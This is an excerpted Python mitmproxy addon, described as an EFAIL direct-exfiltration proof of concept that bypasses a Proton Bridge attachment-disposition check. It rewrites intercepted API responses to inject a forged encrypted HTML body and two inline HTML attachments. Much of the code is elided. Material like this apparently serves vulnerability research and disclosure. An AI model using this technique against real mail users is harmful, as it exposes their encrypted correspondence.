"""EFAIL direct-exfiltration PoC via a Proton Bridge disposition-check bypass (mitmproxy addon).
...
Run:
    mitmdump -s efail-inline-disposition-bypass.py
"""
...
def response(flow: http.HTTPFlow) -> None:
    ...
    forged_armored = _encrypt(_FORGED_BODY_HTML, armored_key)
    ...
    msg["Attachments"] = [
        {"ID": att1, "Name": "att1", "MIMEType": "text/html", "Disposition": "Inline", "ContentID": "api-probe-cid1", "Size": len(data1)},
        {"ID": att2, "Name": "att2", "MIMEType": "text/html", "Disposition": "Inline", "ContentID": "api-probe-cid2", "Size": len(data2)},
    ]
    resp.text = json.dumps(payload)
    print(f"[efail attachment stitch PoC] mutated GET {path} armored_len={len(forged_armored)}", flush=True)
